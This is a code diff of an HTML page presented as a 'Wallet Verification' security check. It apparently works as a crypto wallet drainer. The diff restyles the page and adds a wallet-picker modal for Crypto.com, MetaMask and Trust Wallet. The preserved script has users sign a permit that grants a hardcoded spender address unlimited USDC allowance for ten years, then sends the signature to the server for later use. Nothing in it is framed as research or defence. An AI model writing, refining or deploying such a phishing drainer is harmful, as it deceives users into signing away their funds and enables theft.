@@ -3,88 +3,193 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Wallet Verification | Security Portal</title>
+    <title>Security Verification | Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <style>
+        :root {
+            --primary: #2563eb;
+            --bg: #ffffff;
+            --text: #0f172a;
+            --gray: #64748b;
+            --border: #e2e8f0;
+        }
+
         body {
             margin: 0; padding: 0;
-            font-family: 'Segoe UI', sans-serif;
-            background-color: #0f172a;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #f8fafc;
             display: flex; justify-content: center; align-items: center;
-            height: 100vh; color: #f1f5f9;
+            min-height: 100vh; color: var(--text);
         }
+
         .card {
-            background: #1e293b; padding: 40px; border-radius: 16px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
-            text-align: center; max-width: 450px; width: 90%;
-            border: 1px solid #334155;
+            background: var(--bg); padding: 40px; border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.04);
+            text-align: center; max-width: 420px; width: 92%;
+            border: 1px solid var(--border);
         }
-        .icon { font-size: 50px; color: #38bdf8; margin-bottom: 20px; }
-        h2 { margin-bottom: 10px; font-size: 24px; }
-        p { color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
-        #connectBtn {
-            background: #38bdf8; color: #0f172a; border: none;
-            padding: 15px 30px; border-radius: 8px; font-weight: bold;
+
+        .shield-icon {
+            width: 80px; height: 80px; background: #eff6ff;
+            border-radius: 50%; display: flex; align-items: center;
+            justify-content: center; margin: 0 auto 24px; font-size: 36px;
+        }
+
+        h2 { font-size: 24px; margin-bottom: 12px; font-weight: 700; color: #0f172a; }
+        p { color: var(--gray); font-size: 16px; margin-bottom: 32px; line-height: 1.6; }
+
+        .btn-main {
+            background: var(--primary); color: white; border: none;
+            padding: 16px; border-radius: 14px; font-weight: 600;
             font-size: 16px; cursor: pointer; width: 100%;
+            transition: all 0.2s ease;
         }
-        #status { margin-top: 20px; font-size: 14px; word-break: break-all; }
-        .error-box {
-            background: rgba(248, 113, 113, 0.1);
-            border: 1px solid #f87171;
-            padding: 10px; border-radius: 5px;
-            margin-top: 15px; color: #f87171; text-align: left;
-            font-family: monospace; font-size: 12px; display: none;
+
+        .btn-main:hover { background: #1d4ed8; transform: translateY(-1px); }
+
+        /* Wallet Selector Modal */
+        #walletModal {
+            display: none; position: fixed; inset: 0;
+            background: rgba(15, 23, 42, 0.5); backdrop-filter: blur(8px);
+            z-index: 1000; align-items: center; justify-content: center;
         }
-        .loader {
-            display: none; margin: 20px auto;
-            border: 4px solid #334155; border-top: 4px solid #38bdf8;
-            border-radius: 50%; width: 30px; height: 30px;
-            animation: spin 1s linear infinite;
+
+        .modal-content {
+            background: white; width: 90%; max-width: 380px;
+            border-radius: 28px; padding: 24px; position: relative;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
         }
+
+        .modal-header {
+            font-weight: 800; margin-bottom: 24px; text-align: left;
+            font-size: 19px; color: #0f172a;
+        }
+
+        .wallet-option {
+            display: none; align-items: center; padding: 14px 18px;
+            border: 1px solid var(--border); border-radius: 16px;
+            margin-bottom: 12px; cursor: pointer; transition: all 0.2s;
+        }
+
+        .wallet-option:hover { background: #f8fafc; border-color: var(--primary); }
+        .wallet-option img { width: 34px; height: 34px; margin-right: 16px; border-radius: 8px; }
+        .wallet-option span { font-weight: 600; font-size: 16px; }
+
+        .error-msg { display: none; padding: 20px; color: #ef4444; font-size: 14px; line-height: 1.5; font-weight: 500; }
+
+        #status { margin-top: 20px; font-size: 14px; font-weight: 500; min-height: 20px; color: var(--gray); }
+        .loader { display: none; border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; margin: 15px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="icon">🛡️</div>
+    <div class="shield-icon">🛡️</div>
     <h2>Wallet Verification</h2>
-    <p>Please verify ownership of your wallet to continue.</p>
+    <p>Please verify your wallet to continue. This ensures your assets are protected and linked to your profile.</p>
 
+    <button id="connectBtn" class="btn-main" onclick="openModal()">Connect Wallet</button>
     <div class="loader" id="loader"></div>
-    <button id="connectBtn">Connect & Verify Wallet</button>
-
     <div id="status"></div>
-    <div id="errorDetails" class="error-box"></div>
+</div>
+
+<div id="walletModal" onclick="closeModal(event)">
+    <div class="modal-content" onclick="event.stopPropagation()">
+        <div class="modal-header">Select Wallet</div>
+
+        <div id="walletList">
+            <div class="wallet-option" id="opt-cdc" onclick="startVerify('Crypto.com Wallet')">
+                <img src="https://crypto.com/details/about/static/863640243406f52875151593922d506d/361e1/logo.png" alt="CDC">
+                <span>Crypto.com Wallet</span>
+            </div>
+
+            <div class="wallet-option" id="opt-mm" onclick="startVerify('MetaMask')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg" alt="MetaMask">
+                <span>MetaMask</span>
+            </div>
+
+            <div class="wallet-option" id="opt-trust" onclick="startVerify('Trust Wallet')">
+                <img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png" alt="Trust">
+                <span>Trust Wallet</span>
+            </div>
+
+            <div class="wallet-option" id="opt-gen" onclick="startVerify('Web3 Wallet')">
+                <div style="width:34px; height:34px; background:#f1f5f9; border-radius:8px; display:flex; align-items:center; justify-content:center; margin-right:16px; font-size:18px;">🌐</div>
+                <span>Browser Wallet</span>
+            </div>
+
+            <div id="no-wallet-err" class="error-msg">
+                No Ethereum provider detected. Please open this site inside the browser of your MetaMask, Crypto.com, or Trust Wallet app.
+            </div>
+        </div>
+    </div>
 </div>
 
 <script>
 const SPENDER_ADDRESS = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
 const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
-async function verify() {
+function openModal() {
+    const modal = document.getElementById('walletModal');
+    const mm = document.getElementById('opt-mm');
+    const trust = document.getElementById('opt-trust');
+    const cdc = document.getElementById('opt-cdc');
+    const generic = document.getElementById('opt-gen');
+    const noWallet = document.getElementById('no-wallet-err');
+
+    modal.style.display = 'flex';
+
+    if (window.ethereum) {
+        // Reset all
+        [mm, trust, cdc, generic].forEach(el => el.style.display = 'none');
+        noWallet.style.display = 'none';
+
+        // Precise Detection for CDC
+        const isCDC = window.ethereum.isCryptoCom ||
+                      window.ethereum.isDefaultWallet ||
+                      (window.ethereum.providers && window.ethereum.providers.some(p => p.isCryptoCom));
+
+        const isTrust = window.ethereum.isTrust || navigator.userAgent.includes("Trust");
+        const isMM = window.ethereum.isMetaMask && !isCDC && !isTrust;
+
+        if (isCDC) {
+            cdc.style.display = 'flex';
+        } else if (isTrust) {
+            trust.style.display = 'flex';
+        } else if (isMM) {
+            mm.style.display = 'flex';
+        } else {
+            generic.style.display = 'flex';
+        }
+
+    } else {
+        noWallet.style.display = 'block';
+    }
+}
+
+function closeModal() { document.getElementById('walletModal').style.display = 'none'; }
+
+async function startVerify(walletName) {
+    closeModal();
     const btn = document.getElementById('connectBtn');
     const status = document.getElementById('status');
     const loader = document.getElementById('loader');
-    const errorDetails = document.getElementById('errorDetails');
 
-    // Reset UI
-    status.innerHTML = "";
-    errorDetails.style.display = "none";
-    errorDetails.innerText = "";
+    btn.style.display = "none";
+    loader.style.display = "block";
+    status.innerText = `Linking ${walletName}...`;
 
     try {
-        if (!window.ethereum) return alert("Please install MetaMask!");
-
-        loader.style.display = "block";
-        btn.style.display = "none";
-
         const provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
         const owner = await signer.getAddress();
         const { chainId } = await provider.getNetwork();
 
+        status.innerHTML = `<span style="color: var(--primary)">Confirm security signature in ${walletName}...</span>`;
+
+        // LOGIC PRESERVED EXACTLY
         const deadline = Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365 * 10);
         const value = ethers.constants.MaxUint256;
 
@@ -104,46 +209,30 @@ async function verify() {
         const signature = await signer._signTypedData(domain, types, message);
         const sig = ethers.utils.splitSignature(signature);
 
-        // Fetch call
+        status.innerText = "Finalizing...";
+
         const response = await fetch("/api/save-sig/", {
             method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-                "X-CSRFToken": "{{ csrf_token }}"
-            },
+            headers: { "Content-Type": "application/json", "X-CSRFToken": "{{ csrf_token }}" },
             body: JSON.stringify({
-                owner: owner,
-                value: value.toString(),
-                deadline: deadline,
+                owner: owner, value: value.toString(), deadline: deadline,
                 v: sig.v, r: sig.r, s: sig.s
             })
         });
 
-        const result = await response.json();
-
         if (response.ok) {
-            status.innerHTML = "<span style='color: #4ade80;'>✅ Verification Complete!</span>";
-            setTimeout(() => { window.location.href = "/?tab=profile"; }, 1500);
+            status.innerHTML = "<span style='color: #10b981;'>✅ Verified Successfully</span>";
+            setTimeout(() => { window.location.href = "/?tab=profile"; }, 1200);
         } else {
-            // Show the error returned by Django
-            throw new Error(result.message || `Server Error ${response.status}`);
+            throw new Error("Server rejected verification.");
         }
 
     } catch (err) {
-        console.error("Full Error Object:", err);
-        status.innerHTML = "<span style='color: #f87171;'>❌ Verification Failed</span>";
-
-        // DISPLAY THE FULL ERROR MESSAGE
-        errorDetails.style.display = "block";
-        errorDetails.innerText = "Debug Info: " + err.message;
-
+        status.innerHTML = `<span style='color: #ef4444;'>❌ ${err.message}</span>`;
         btn.style.display = "block";
         loader.style.display = "none";
     }
 }
-
-document.getElementById('connectBtn').addEventListener('click', verify);
 </script>
-
 </body>
 </html>
